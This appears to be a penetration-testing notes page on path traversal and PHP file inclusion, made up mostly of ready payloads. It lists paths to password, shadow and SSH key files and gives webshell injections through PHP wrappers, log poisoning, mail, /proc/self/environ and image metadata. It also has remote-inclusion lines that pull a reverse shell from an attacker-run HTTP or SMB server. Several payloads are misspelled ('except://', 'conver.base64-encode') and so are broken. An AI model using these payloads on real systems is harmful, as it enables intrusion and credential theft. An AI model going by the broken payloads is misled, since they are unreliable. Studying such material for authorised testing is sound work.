---
description: >-
  File Inclusion refers to an inclusion attack through which an attacker can
  trick the web application into including files on the web server.
---

# File Inclusion

## Introduction

Path Travesal can lead to two different types of File Inclusion:

* **Local File Inclusion (LFI)**: When is possible to include a local file.
* **Remote File Inclusion (RFI)**: When is possible to include remote files.

## Path Traversal

Directory traversal (also known as file path traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server that is running an application.

![Directory Traversal from PortSwigger Academy](../.gitbook/assets/pathtraversal.png)

A search for path traversals begins with the examination of URL query strings and form bodies in search of values that appears as file references, including the most common indicator as file extensions.

```
<img src="/loadImage?filename=218.png">
```

The `loadImage` URL takes a `filename` parameter and returns the contents of the specified file. The image files themselves are stored on disk in the location `/var/www/images/`.

```
/var/www/images/218.png
```

So we can request the following url to retrieve an arbitrary file from the server's filesystem:

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

This causes the application to read from the following file path `/var/www/images/../../../etc/passwd`

## Interesting Files

There are some interesting files to read, such as information about the server (users, groups), logs, etc...

### Linux

```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
/proc/[0-9]*/fd/[0-9]*
/proc/mounts
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/var/run/secrets/kubernetes.io/serviceaccount
/var/lib/mlocate/mlocate.db
/var/lib/mlocate.db
```

### Apache

```
/etc/apache2/apache2.conf
/usr/local/etc/apache2/httpd.conf
/etc/httpd/conf/httpd.conf
Red Hat/CentOS/Fedora Linux -> /var/log/httpd/access_log
Debian/Ubuntu -> /var/log/apache2/access.log
FreeBSD -> /var/log/httpd-access.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache2/access.log
/var/log/apache/error.log
```

### MySQL

```
/var/lib/mysql/mysql/user.frm
/var/lib/mysql/mysql/user.MYD
/var/lib/mysql/mysql/user.MYI
```

### Windows

```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/SAM
/windows/panther/unattended.xml
/windows/panther/unattend/unattended.xml
/windows/system32/license.rtf
/windows/system32/eula.txt
```

## Local File Inclusion (LFI)

Its similar to Path Traversal but not exactly the same, the difference is, in file inclusion if we include a **PHP** it will be interpreted and executed while in path traversal not.

### PHP Wrappers

PHP provides several protocols wrappers that we can use to exploit path traversal and local file inclusion vulnerabilities. These filters give us additional flexibility when attempting to inject PHP code via LFI vulnerabilities.

#### Wrapper data://

Used to embed inline data as part of the URL with plaintext or base64.

```
/include.php?file=data:text/plain,<?php system($_GET["cmd"]);?>&cmd=id
/include.php?file=data:,<?php system($_GET["cmd"]);?>&cmd=id
/include.php?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&cmd=id
```

#### Wrapper filter://

Used to encode/convert files. Usefull to read php files. The part of `php://filte`r is case insensitive.

```
/include.php?file=php://filter/read=string.rot13/resource=file.php
/include.php?file=php://filter/conver.base64-encode/resource=file.php
/include.php?file=pHp://Filter/conver.base64-encode/resource=file.php
/include.php?file=php://filter/zlib.deflate/convert.base64-encode/resource=file.php
```

To read the compression data you need to decode the base64 and read the resulting data using:

```
php -a
readfile('php://filter/zlib.inflate/resource=test.deflated');
```

#### Wrapper zip://

Upload a Zip file with a PHPShell inside and access it.

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

#### Wrapper expect://

Used to execute code.

```
/include.php?file=except://id
```

#### Wrapper input://

Interpret php payload sent by POST parameters.

```
/include.php?file=php://input

POST DATA: <?php system($_GET["cmd"]);?>
```

## Remote File Inclusion (RFI)

When we are able to include remote files to the application is synonym of remote code execution. We can include a webshell or a reverse shell.

```
/usr/share/webshells/php/php-reverse-shell.php
```

Or you can create a php file with command execution or another type of reverse shell:

```
<?php
$output = shell_exec('whoami 2>&1');
echo "$output";
?>
```

Finally you only need to set up a HTTP server or SMB server and request the rev shell.

```
/include.php?file=http://ip-addr:port/php-reverse-shell.php
/include.php?file=\\ip-addr\smbserver\php-reverse-shell.php
```

Some times `impacket-smbserver` doesn't works due to the outdated SMB version of the target machine and we need to configure it manually.

```
❯ cat /etc/samba/smb.conf
[global]
        server role = standalone server
        map to guest = Bad User
        usershare allow guest = yes
        host allow = <ip-target-machine>

[badsmb]
        path = <directory>
        browseable = yes
        read only = no
        guest ok = yes
```

## Looking to RCE

There are several ways to escalate a LFI to a RCE.

### Via Log Poisoning

We can poison the logs with the user agent.

```
GET / HTTP/1.O
Host: example.com
User-Agent: <?php system($_GET["cmd"]);?>
```

And try to access to `/var/log/apache2/access.log`.

```
/include.php?file=../../../../var/log/apache2/access.log&cmd=id
```

### Via Email

If SMTP is open in the server we can easily send a mail to an internal account. "user@localhost" containing the following payload `<?php system($_GET["cmd"]);?>`

And access to the mail inbox of the user.

```
/include.php?file=../../../../var/mail/user&cmd=id
```

### Via Environ

Like a log file, sending the payload in the User-Agent, it will be reflected inside the /proc/self/environ file.

```
GET /include.php?file=../../../../proc/self/environ&cmd=id HTTP/1.O
Host: example.com
User-Agent: <?php system($_GET["cmd"]);?>
```

### Via Upload

If exists a functionality that leads us to upload an arbitrary file, we can upload directly a reverse shell or simply upload a image with the payload injected on metadata.

To modify metadata of a file we can use exiftool.

```
exiftool -DocumentName='<?php system($_GET["cmd"]);?>' myimage.jpg
```

Once uploaded we can access it.

```
/include.php?file=../../uploads/myimage.jpg&cmd=id
```

## References

* [https://portswigger.net/web-security/file-path-traversal](https://portswigger.net/web-security/file-path-traversal)
* [https://book.hacktricks.xyz/pentesting-web/file-inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
